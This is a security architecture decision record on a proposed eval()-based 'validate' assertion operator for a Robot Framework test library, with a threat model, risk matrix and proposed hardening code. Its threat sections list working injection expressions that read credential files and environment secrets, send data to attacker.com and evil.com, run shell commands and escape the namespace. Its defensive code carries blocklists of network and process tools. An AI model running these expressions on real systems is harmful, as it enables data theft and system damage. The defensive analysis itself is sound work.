# ADR-013: Security Analysis of AssertionEngine validate Operator

| ADR ID | ADR-013 |
|--------|---------|
| Title | Security Analysis of AssertionEngine `validate` Operator |
| Status | Proposed |
| Date | 2026-01-20 |
| Authors | Security Architecture Team |
| Related | ADR-007 (Unified Keyword API), ADR-008 (Security Architecture) |

## Executive Summary

This document provides a comprehensive security analysis of the proposed `validate` operator in the AssertionEngine, which uses Python's `eval()` (via Robot Framework's `BuiltIn().evaluate()`) to enable arbitrary Python expressions in test assertions. This analysis identifies critical security risks, assesses threat vectors, evaluates existing mitigations, and recommends security controls.

**Critical Finding**: The `validate` operator introduces a **code injection attack surface** that, while intentional for flexibility, requires careful security controls to prevent abuse in CI/CD pipelines, shared test environments, and enterprise deployments.

## Context

### Proposed validate Operator Implementation

The AssertionEngine's `validate` operator, as referenced in ADR-007, would allow test authors to write arbitrary Python expressions:

```python
# Proposed implementation pattern (based on Browser Library)
AssertionOperator["validate"] = (
    lambda a, b: BuiltIn().evaluate(b, namespace={"value": a}),
    "should validate to true with",
)
```

This enables powerful test assertions:

```robot
*** Test Cases ***
Test Value Length
    Get Text    JLabel#status    validate    len(value) > 5
    Get Element Count    JButton    validate    value % 2 == 0
    Get Property    JTable#data    rowCount    validate    value >= 10 and value <= 100
```

### How BuiltIn().evaluate() Works

Robot Framework's `BuiltIn().evaluate()` is a wrapper around Python's `eval()`:

```python
# Simplified from robot.libraries.BuiltIn
def evaluate(self, expression, modules=None, namespace=None):
    """Evaluates the given expression in Python and returns the result."""
    namespace = namespace or {}
    # ... module handling ...
    return eval(expression, namespace)
```

Key characteristics:
- **Full Python eval()**: Expression has access to Python's `eval()` capabilities
- **Custom namespace**: The `namespace` parameter restricts available variables
- **No built-in sandboxing**: Standard Python builtins are available unless explicitly restricted

## Threat Analysis

### 1. Code Injection via Expected Value

**Threat Vector**: Malicious or careless test authors can inject arbitrary Python code through the `expected` parameter.

**Attack Examples**:

```robot
# Information disclosure - read environment variables
Get Text    JLabel    validate    __import__('os').environ.get('API_KEY', 'not found') or True

# File system access - read sensitive files
Get Text    JLabel    validate    open('/etc/passwd').read() or True

# Network access - exfiltrate data
Get Text    JLabel    validate    __import__('urllib.request').urlopen('https://attacker.com/?data=' + str(value)) or True

# Arbitrary code execution
Get Text    JLabel    validate    exec("import subprocess; subprocess.run(['rm', '-rf', '/tmp/test'])") or True

# Infinite loop - denial of service
Get Text    JLabel    validate    (lambda: [None for _ in iter(int, 1)])() or True
```

**Severity**: CRITICAL
**Likelihood**: Medium (requires test file access)
**Impact**: Complete system compromise

### 2. Namespace Escape Attacks

**Threat Vector**: Bypassing the limited namespace to access Python internals.

**Attack Examples**:

```python
# Access builtins through value's class
Get Text    JLabel    validate    value.__class__.__bases__[0].__subclasses__()

# Import arbitrary modules
Get Text    JLabel    validate    [c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('id')

# Access global namespace
Get Text    JLabel    validate    (lambda: None).__globals__
```

**Severity**: HIGH
**Likelihood**: Low (requires Python internals knowledge)
**Impact**: Sandbox bypass, arbitrary code execution

### 3. Resource Exhaustion

**Threat Vector**: Expressions that consume excessive CPU, memory, or time.

**Attack Examples**:

```robot
# CPU exhaustion - complex computation
Get Text    JLabel    validate    sum(range(10**10))

# Memory exhaustion - allocate large structures
Get Text    JLabel    validate    'A' * (10**9)

# Infinite recursion
Get Text    JLabel    validate    (lambda f: f(f))(lambda f: f(f))

# Regex catastrophic backtracking (ReDoS)
Get Text    JLabel    validate    __import__('re').match('(a+)+$', 'a' * 30 + '!')
```

**Severity**: MEDIUM
**Likelihood**: Medium
**Impact**: Test infrastructure DoS, CI/CD pipeline disruption

### 4. File System Access

**Threat Vector**: Read/write/delete files on the test execution system.

**Attack Examples**:

```robot
# Read arbitrary files
Get Text    JLabel    validate    open('/etc/shadow').read() and True

# Write files (information persistence)
Get Text    JLabel    validate    open('/tmp/exfil.txt', 'w').write(str(value)) and True

# Delete files
Get Text    JLabel    validate    __import__('os').remove('/important/file') or True

# Path traversal
Get Text    JLabel    validate    open('../../../etc/passwd').read() and True
```

**Severity**: HIGH
**Likelihood**: Medium
**Impact**: Data exfiltration, system damage

### 5. Network Access

**Threat Vector**: Establish network connections to exfiltrate data or attack other systems.

**Attack Examples**:

```robot
# HTTP exfiltration
Get Text    JLabel    validate    __import__('urllib.request').urlopen('https://evil.com/' + value.replace(' ', '%20')) and True

# Socket connections
Get Text    JLabel    validate    __import__('socket').socket().connect(('attacker.com', 4444)) or True

# DNS exfiltration
Get Text    JLabel    validate    __import__('socket').gethostbyname(value.encode().hex() + '.attacker.com') or True
```

**Severity**: HIGH
**Likelihood**: Medium
**Impact**: Data exfiltration, lateral movement

### 6. Import Injection

**Threat Vector**: Import malicious or dangerous Python modules.

**Attack Examples**:

```robot
# Import subprocess
Get Text    JLabel    validate    __import__('subprocess').check_output(['whoami'])

# Import pickle (deserialization attacks)
Get Text    JLabel    validate    __import__('pickle').loads(b'malicious_payload')

# Import ctypes (native code execution)
Get Text    JLabel    validate    __import__('ctypes').CDLL('libc.so.6')
```

**Severity**: CRITICAL
**Likelihood**: Medium
**Impact**: Arbitrary code execution

## Risk Assessment Matrix

| Threat | Likelihood | Impact | Risk Level | Priority |
|--------|------------|--------|------------|----------|
| Code injection via test data | Medium | Critical | **CRITICAL** | P0 |
| Code injection via malicious test file | High | Critical | **CRITICAL** | P0 |
| CI/CD pipeline abuse | High | High | **HIGH** | P1 |
| Namespace escape (sandbox bypass) | Low | Critical | **HIGH** | P1 |
| Resource exhaustion (DoS) | Medium | Medium | **MEDIUM** | P2 |
| File system access | Medium | High | **HIGH** | P1 |
| Network access/exfiltration | Medium | High | **HIGH** | P1 |
| Import injection | Medium | Critical | **CRITICAL** | P0 |
| Information disclosure | High | Medium | **MEDIUM** | P2 |
| Privilege escalation (if running as root) | Low | Critical | **HIGH** | P1 |

## Existing Mitigations Analysis

### What Robot Framework's BuiltIn.evaluate Provides

1. **Limited namespace by default**: Only specified variables are available in the namespace
   - **Effectiveness**: LOW - Python builtins are still accessible via `__builtins__`

2. **Module restriction option**: The `modules` parameter can limit available modules
   - **Effectiveness**: MEDIUM - Can be bypassed via `__import__` or object introspection

3. **No code caching**: Each expression is evaluated fresh
   - **Effectiveness**: MINIMAL - Does not prevent attacks

### Current AssertionEngine Design Mitigations

Based on the proposed design in ADR-007:

1. **Limited namespace `{"value": a}`**: Only the `value` variable is exposed
   - **Effectiveness**: LOW - Does not prevent `__import__`, builtins access, or object traversal

2. **Expression is from test file (not user input)**: Reduces runtime injection risk
   - **Effectiveness**: MEDIUM - Malicious test files are still a threat vector

3. **Test files are typically code-reviewed**: Standard development process
   - **Effectiveness**: MEDIUM - Depends on review quality; complex expressions may be missed

### Gap Analysis

| Control | Needed | Current Status |
|---------|--------|----------------|
| Block dangerous builtins | Yes | NOT IMPLEMENTED |
| Block `__import__` | Yes | NOT IMPLEMENTED |
| Block dunder attribute access | Yes | NOT IMPLEMENTED |
| Expression complexity limits | Yes | NOT IMPLEMENTED |
| Timeout enforcement | Yes | NOT IMPLEMENTED |
| Memory limits | Yes | NOT IMPLEMENTED |
| Audit logging | Yes | NOT IMPLEMENTED |
| Enterprise disable option | Yes | NOT IMPLEMENTED |

## Security Recommendations

### 1. Security Configuration Class

```python
from dataclasses import dataclass, field
from typing import List, Set, Optional, Pattern
import re

@dataclass
class ValidateOperatorSecurityConfig:
    """Security configuration for the validate operator.

    IMPORTANT: Default configuration is PERMISSIVE for backwards compatibility
    with Browser Library patterns. Enterprise deployments SHOULD enable
    strict mode.
    """

    # Master switch - disable validate operator entirely
    allow_validate_operator: bool = True

    # Strict mode - enables all security controls
    strict_mode: bool = False

    # Blocked Python builtins (always blocked regardless of strict_mode)
    blocked_builtins: Set[str] = field(default_factory=lambda: {
        "__import__",
        "exec",
        "eval",
        "compile",
        "open",
        "input",
        "breakpoint",
        "help",
        "exit",
        "quit",
    })

    # Additional blocked builtins in strict mode
    strict_blocked_builtins: Set[str] = field(default_factory=lambda: {
        "getattr",
        "setattr",
        "delattr",
        "globals",
        "locals",
        "vars",
        "dir",
        "type",
        "isinstance",
        "issubclass",
        "hasattr",
        "memoryview",
        "bytearray",
        "bytes",
    })

    # Block dunder (double underscore) attribute access
    block_dunder_access: bool = True

    # Blocked patterns in expressions (compiled regexes)
    blocked_patterns: List[str] = field(default_factory=lambda: [
        r"__\w+__",           # Dunder attributes
        r"\bimport\b",        # import keyword
        r"\blambda\b",        # lambda (can hide complexity) - strict only
        r"\.read\(",          # File read operations
        r"\.write\(",         # File write operations
        r"socket",            # Socket operations
        r"subprocess",        # Subprocess operations
        r"popen",             # Process spawning
        r"system\(",          # os.system
        r"spawn",             # Process spawning
        r"fork\(",            # Process forking
    ])

    # Expression whitelist patterns (if non-empty, ONLY these are allowed)
    # Use for maximum security in enterprise environments
    whitelist_patterns: List[str] = field(default_factory=list)

    # Maximum expression length
    max_expression_length: int = 1000

    # Maximum expression complexity (AST node count)
    max_ast_complexity: int = 50

    # Expression evaluation timeout (seconds)
    expression_timeout: float = 5.0

    # Audit logging
    audit_validate_usage: bool = True
    audit_log_expressions: bool = False  # WARNING: May log sensitive data

    # Safe functions whitelist (these are allowed even in strict mode)
    safe_functions: Set[str] = field(default_factory=lambda: {
        "len",
        "str",
        "int",
        "float",
        "bool",
        "abs",
        "min",
        "max",
        "sum",
        "round",
        "sorted",
        "reversed",
        "enumerate",
        "zip",
        "range",
        "all",
        "any",
        "filter",
        "map",
    })

    def get_blocked_builtins(self) -> Set[str]:
        """Get the complete set of blocked builtins based on mode."""
        blocked = self.blocked_builtins.copy()
        if self.strict_mode:
            blocked.update(self.strict_blocked_builtins)
        return blocked


# Enterprise preset configurations
SECURITY_PRESETS = {
    "permissive": ValidateOperatorSecurityConfig(
        strict_mode=False,
        audit_validate_usage=False,
    ),
    "standard": ValidateOperatorSecurityConfig(
        strict_mode=False,
        audit_validate_usage=True,
        block_dunder_access=True,
    ),
    "strict": ValidateOperatorSecurityConfig(
        strict_mode=True,
        audit_validate_usage=True,
        block_dunder_access=True,
        max_expression_length=500,
        max_ast_complexity=30,
        expression_timeout=2.0,
    ),
    "disabled": ValidateOperatorSecurityConfig(
        allow_validate_operator=False,
    ),
}
```

### 2. Safe Expression Evaluator

```python
import ast
import signal
import threading
from contextlib import contextmanager
from typing import Any, Dict, Optional
from robot.libraries.BuiltIn import BuiltIn


class SecureExpressionEvaluator:
    """Secure wrapper for Python expression evaluation.

    Provides multiple layers of security:
    1. AST-based static analysis before evaluation
    2. Restricted namespace with blocked builtins
    3. Timeout enforcement
    4. Audit logging
    """

    def __init__(self, config: ValidateOperatorSecurityConfig):
        self.config = config
        self._compiled_blocked_patterns = [
            re.compile(p, re.IGNORECASE)
            for p in config.blocked_patterns
        ]
        self._compiled_whitelist_patterns = [
            re.compile(p, re.IGNORECASE)
            for p in config.whitelist_patterns
        ] if config.whitelist_patterns else None

    def evaluate(
        self,
        expression: str,
        value: Any,
        context: Optional[Dict[str, Any]] = None
    ) -> bool:
        """Securely evaluate a validate expression.

        Args:
            expression: The Python expression to evaluate
            value: The actual value to validate (available as 'value')
            context: Optional additional context for audit logging

        Returns:
            bool: Result of the expression evaluation

        Raises:
            SecurityError: If expression violates security policy
            TimeoutError: If expression exceeds timeout
            EvaluationError: If expression fails to evaluate
        """
        if not self.config.allow_validate_operator:
            raise SecurityError(
                "The 'validate' operator is disabled by security policy. "
                "Contact your administrator to enable it or use alternative operators."
            )

        # Audit log the attempt
        if self.config.audit_validate_usage:
            self._audit_log("validate_attempt", expression, context)

        # Static analysis
        self._validate_expression_static(expression)

        # Build restricted namespace
        namespace = self._build_restricted_namespace(value)

        # Evaluate with timeout
        try:
            result = self._evaluate_with_timeout(expression, namespace)
        except Exception as e:
            if self.config.audit_validate_usage:
                self._audit_log("validate_error", expression, context, error=str(e))
            raise

        # Audit log success
        if self.config.audit_validate_usage:
            self._audit_log("validate_success", expression, context, result=result)

        return bool(result)

    def _validate_expression_static(self, expression: str) -> None:
        """Perform static analysis on the expression before evaluation."""

        # Length check
        if len(expression) > self.config.max_expression_length:
            raise SecurityError(
                f"Expression exceeds maximum length "
                f"({len(expression)} > {self.config.max_expression_length})"
            )

        # Whitelist check (if configured)
        if self._compiled_whitelist_patterns:
            if not any(p.fullmatch(expression) for p in self._compiled_whitelist_patterns):
                raise SecurityError(
                    "Expression does not match any allowed pattern. "
                    "Only whitelisted expression patterns are permitted."
                )
            return  # Whitelist match bypasses other checks

        # Blocked pattern check
        for pattern in self._compiled_blocked_patterns:
            if pattern.search(expression):
                raise SecurityError(
                    f"Expression contains blocked pattern: {pattern.pattern}"
                )

        # Dunder access check
        if self.config.block_dunder_access and "__" in expression:
            raise SecurityError(
                "Double-underscore (dunder) attribute access is not permitted"
            )

        # AST complexity check
        try:
            tree = ast.parse(expression, mode='eval')
            node_count = sum(1 for _ in ast.walk(tree))
            if node_count > self.config.max_ast_complexity:
                raise SecurityError(
                    f"Expression complexity exceeds limit "
                    f"({node_count} > {self.config.max_ast_complexity})"
                )

            # Check for dangerous AST nodes
            self._check_ast_nodes(tree)

        except SyntaxError as e:
            raise EvaluationError(f"Invalid expression syntax: {e}")

    def _check_ast_nodes(self, tree: ast.AST) -> None:
        """Check AST for dangerous node types."""
        dangerous_nodes = {
            ast.Import: "import statements",
            ast.ImportFrom: "from-import statements",
        }

        for node in ast.walk(tree):
            for node_type, description in dangerous_nodes.items():
                if isinstance(node, node_type):
                    raise SecurityError(
                        f"Expression contains forbidden construct: {description}"
                    )

            # Check for attribute access to blocked names
            if isinstance(node, ast.Attribute):
                if node.attr.startswith('_') and self.config.block_dunder_access:
                    raise SecurityError(
                        f"Access to private/dunder attribute '{node.attr}' is not permitted"
                    )

            # Check for calls to blocked builtins
            if isinstance(node, ast.Call):
                if isinstance(node.func, ast.Name):
                    func_name = node.func.id
                    if func_name in self.config.get_blocked_builtins():
                        raise SecurityError(
                            f"Call to blocked function '{func_name}' is not permitted"
                        )

    def _build_restricted_namespace(self, value: Any) -> Dict[str, Any]:
        """Build a restricted namespace for expression evaluation."""
        blocked = self.config.get_blocked_builtins()

        # Start with safe builtins only
        safe_builtins = {
            name: getattr(__builtins__ if isinstance(__builtins__, dict)
                         else __builtins__.__dict__, name, None)
            for name in self.config.safe_functions
        }

        # Add safe type constructors
        safe_builtins.update({
            "True": True,
            "False": False,
            "None": None,
        })

        # Remove any blocked items that might have slipped through
        for blocked_name in blocked:
            safe_builtins.pop(blocked_name, None)

        return {
            "value": value,
            "__builtins__": safe_builtins,
        }

    def _evaluate_with_timeout(
        self,
        expression: str,
        namespace: Dict[str, Any]
    ) -> Any:
        """Evaluate expression with timeout enforcement."""
        result = [None]
        exception = [None]

        def evaluate_target():
            try:
                result[0] = eval(expression, namespace, namespace)
            except Exception as e:
                exception[0] = e

        thread = threading.Thread(target=evaluate_target)
        thread.daemon = True
        thread.start()
        thread.join(timeout=self.config.expression_timeout)

        if thread.is_alive():
            raise TimeoutError(
                f"Expression evaluation exceeded timeout "
                f"({self.config.expression_timeout}s)"
            )

        if exception[0] is not None:
            raise EvaluationError(
                f"Expression evaluation failed: {exception[0]}"
            )

        return result[0]

    def _audit_log(
        self,
        event_type: str,
        expression: str,
        context: Optional[Dict[str, Any]] = None,
        error: Optional[str] = None,
        result: Optional[Any] = None
    ) -> None:
        """Log security audit event."""
        import json
        import datetime

        log_entry = {
            "timestamp": datetime.datetime.utcnow().isoformat(),
            "event_type": event_type,
            "expression_length": len(expression),
            "context": context or {},
        }

        if self.config.audit_log_expressions:
            log_entry["expression"] = expression
        else:
            log_entry["expression_hash"] = hash(expression)

        if error:
            log_entry["error"] = error
        if result is not None:
            log_entry["result"] = str(result)[:100]

        # Log to Robot Framework log and security audit file
        try:
            BuiltIn().log(
                f"[SECURITY AUDIT] validate operator: {json.dumps(log_entry)}",
                level="DEBUG"
            )
        except:
            pass  # Don't fail if logging fails


class SecurityError(Exception):
    """Raised when expression violates security policy."""
    pass


class EvaluationError(Exception):
    """Raised when expression evaluation fails."""
    pass
```

### 3. Integration with AssertionEngine

```python
from typing import Any, Callable, Dict, Tuple

class SecureAssertionEngine:
    """Assertion engine with security-hardened validate operator."""

    def __init__(self, security_config: ValidateOperatorSecurityConfig = None):
        self.security_config = security_config or ValidateOperatorSecurityConfig()
        self._secure_evaluator = SecureExpressionEvaluator(self.security_config)

        # Define operators with security context
        self._operators: Dict[str, Tuple[Callable, str]] = {
            # Safe comparison operators (no eval)
            "==": (lambda a, b: a == b, "should be equal to"),
            "!=": (lambda a, b: a != b, "should not be equal to"),
            "contains": (lambda a, b: b in str(a), "should contain"),
            "not contains": (lambda a, b: b not in str(a), "should not contain"),
            ">": (lambda a, b: self._safe_compare(a, b, lambda x, y: x > y), "should be greater than"),
            "<": (lambda a, b: self._safe_compare(a, b, lambda x, y: x < y), "should be less than"),
            ">=": (lambda a, b: self._safe_compare(a, b, lambda x, y: x >= y), "should be greater than or equal to"),
            "<=": (lambda a, b: self._safe_compare(a, b, lambda x, y: x <= y), "should be less than or equal to"),
            "matches": (lambda a, b: self._safe_regex_match(a, b), "should match pattern"),
            "starts with": (lambda a, b: str(a).startswith(b), "should start with"),
            "ends with": (lambda a, b: str(a).endswith(b), "should end with"),

            # SECURITY-SENSITIVE: validate operator with eval
            "validate": (
                lambda a, b: self._secure_validate(a, b),
                "should validate to true with"
            ),
        }

    def _secure_validate(self, actual: Any, expression: str) -> bool:
        """Execute validate operator with security controls."""
        return self._secure_evaluator.evaluate(
            expression=expression,
            value=actual,
            context={"operator": "validate"}
        )

    def _safe_compare(
        self,
        actual: Any,
        expected: Any,
        comparator: Callable[[Any, Any], bool]
    ) -> bool:
        """Safely compare values with type coercion."""
        try:
            # Try numeric comparison first
            actual_num = float(actual) if not isinstance(actual, (int, float)) else actual
            expected_num = float(expected) if not isinstance(expected, (int, float)) else expected
            return comparator(actual_num, expected_num)
        except (ValueError, TypeError):
            # Fall back to string comparison
            return comparator(str(actual), str(expected))

    def _safe_regex_match(self, actual: Any, pattern: str) -> bool:
        """Safely execute regex match with ReDoS protection."""
        import re
        try:
            # Use regex with size limits to prevent ReDoS
            compiled = re.compile(
                pattern,
                # No flags that could be dangerous
            )
            return compiled.search(str(actual)) is not None
        except re.error as e:
            raise EvaluationError(f"Invalid regex pattern: {e}")
```

### 4. Claude-Flow Security Hook Integration

```python
# hooks/validate_security_hook.py
"""
Security hook for scanning validate expressions before execution.

Integrates with Claude-Flow's pre-command hook system to detect
dangerous validate expressions in test files.
"""

import re
from typing import Dict, List, Any
from pathlib import Path


class ValidateSecurityScanner:
    """Scan Robot Framework test files for dangerous validate expressions."""

    DANGEROUS_PATTERNS = [
        (r"__import__", "Module import detected"),
        (r"__\w+__", "Dunder attribute access detected"),
        (r"\bexec\b", "exec() call detected"),
        (r"\beval\b", "eval() call detected"),
        (r"\bopen\s*\(", "File open detected"),
        (r"\bsubprocess\b", "subprocess module detected"),
        (r"\.system\s*\(", "os.system() detected"),
        (r"\bsocket\b", "socket module detected"),
        (r"requests\.", "HTTP requests detected"),
        (r"urllib", "urllib module detected"),
    ]

    def scan_file(self, file_path: Path) -> List[Dict[str, Any]]:
        """Scan a Robot Framework file for dangerous validate expressions.

        Returns:
            List of findings with file location and severity
        """
        findings = []
        content = file_path.read_text()

        # Find all validate operator usages
        validate_pattern = re.compile(
            r'(Get\s+(?:Text|Value|Property|Element\s+(?:Count|States)))'
            r'.*?validate\s+(.+?)(?:\n|\r|$)',
            re.IGNORECASE | re.MULTILINE
        )

        for match in validate_pattern.finditer(content):
            keyword = match.group(1)
            expression = match.group(2).strip()
            line_num = content[:match.start()].count('\n') + 1

            for pattern, description in self.DANGEROUS_PATTERNS:
                if re.search(pattern, expression, re.IGNORECASE):
                    findings.append({
                        "file": str(file_path),
                        "line": line_num,
                        "keyword": keyword,
                        "expression": expression[:100],
                        "pattern": pattern,
                        "description": description,
                        "severity": "HIGH",
                        "recommendation": "Review expression for security implications",
                    })

        return findings

    def scan_directory(self, directory: Path) -> List[Dict[str, Any]]:
        """Scan all Robot Framework files in a directory."""
        all_findings = []

        for robot_file in directory.rglob("*.robot"):
            findings = self.scan_file(robot_file)
            all_findings.extend(findings)

        return all_findings


def pre_command_hook(context: Dict[str, Any]) -> Dict[str, Any]:
    """Claude-Flow pre-command hook for validate expression scanning.

    Usage in claude-flow.config.json:
    {
        "hooks": {
            "pre-command": ["validate_security_hook:pre_command_hook"]
        }
    }
    """
    command = context.get("command", "")

    # Check if running robot tests
    if "robot" in command.lower() or "pabot" in command.lower():
        # Extract test directory/file from command
        # This is simplified - real implementation would parse args properly
        scanner = ValidateSecurityScanner()

        # Scan current directory for robot files
        findings = scanner.scan_directory(Path("."))

        if findings:
            return {
                "action": "warn",
                "message": f"Found {len(findings)} potentially dangerous validate expressions",
                "findings": findings,
            }

    return {"action": "allow"}
```

### 5. Enterprise Configuration Examples

```yaml
# enterprise-security-config.yaml
# Strict security configuration for enterprise deployments

javagui:
  assertion_engine:
    validate_operator:
      # Completely disable validate operator in production
      enabled: false

      # Or use strict mode with whitelist
      # enabled: true
      # strict_mode: true
      # whitelist_patterns:
      #   - "len\\(value\\)\\s*(==|!=|>|<|>=|<=)\\s*\\d+"
      #   - "value\\s*(==|!=|>|<|>=|<=)\\s*\\d+"
      #   - "value\\s+in\\s+\\[.*\\]"

      # Audit all usage
      audit:
        enabled: true
        log_expressions: false  # Don't log expressions to avoid leaking test logic
        retention_days: 90

      # Resource limits
      limits:
        max_expression_length: 200
        max_complexity: 20
        timeout_seconds: 2.0

# CI/CD specific overrides
ci_cd:
  # Scan for dangerous patterns before test execution
  pre_scan:
    enabled: true
    fail_on_findings: true

  # Block certain patterns entirely in CI
  blocked_patterns:
    - "__import__"
    - "subprocess"
    - "socket"
    - "requests"
```

## Default Security Posture Recommendation

### Should validate Operator Be Allowed by Default?

**Recommendation**: YES, but with security controls enabled by default.

**Rationale**:
1. **Compatibility**: Browser Library users expect `validate` operator
2. **Flexibility**: Legitimate use cases require expression evaluation
3. **Defense in Depth**: Multiple security layers mitigate risk
4. **Audit Trail**: Logging enables post-incident investigation

### Recommended Default Configuration

```python
DEFAULT_SECURITY_CONFIG = ValidateOperatorSecurityConfig(
    allow_validate_operator=True,
    strict_mode=False,
    block_dunder_access=True,        # Block __import__, __class__, etc.
    audit_validate_usage=True,        # Log all validate usage
    audit_log_expressions=False,      # Don't log expressions by default
    max_expression_length=1000,
    max_ast_complexity=50,
    expression_timeout=5.0,
)
```

### Enterprise Hardening Recommendations

| Environment | Recommendation |
|-------------|---------------|
| Development | Standard configuration |
| CI/CD | Strict mode with pre-scan |
| Production Test Env | Strict mode or disabled |
| Shared/Multi-tenant | Disabled or whitelist-only |
| Air-gapped/Secure | Disabled |

## Documentation Requirements

### User Documentation

1. **Security Warning**: Document that `validate` uses Python eval()
2. **Safe Usage Examples**: Provide examples of secure validate expressions
3. **Dangerous Patterns**: List patterns that should be avoided
4. **Enterprise Configuration**: Document how to harden for enterprise use

### Security Documentation

1. **Threat Model**: Reference this ADR
2. **Incident Response**: Procedures for validate-related security incidents
3. **Audit Log Format**: Document audit log schema for SIEM integration

## Compliance Considerations

| Standard | Requirement | Mitigation |
|----------|-------------|------------|
| SOC 2 | Audit logging | Enable audit_validate_usage |
| PCI DSS | Code execution controls | Disable in card data environments |
| HIPAA | Access controls | Whitelist-only in PHI environments |
| FedRAMP | Security controls | Strict mode with comprehensive logging |

## References

- ADR-007: Unified Keyword API Design
- ADR-008: Security Architecture
- [OWASP Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
- [CWE-94: Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)
- [Robot Framework BuiltIn Library - evaluate](https://robotframework.org/robotframework/latest/libraries/BuiltIn.html#Evaluate)
- [Browser Library Assertion Engine](https://robotframework-browser.org/#assertions)
- [Python AST Module Documentation](https://docs.python.org/3/library/ast.html)
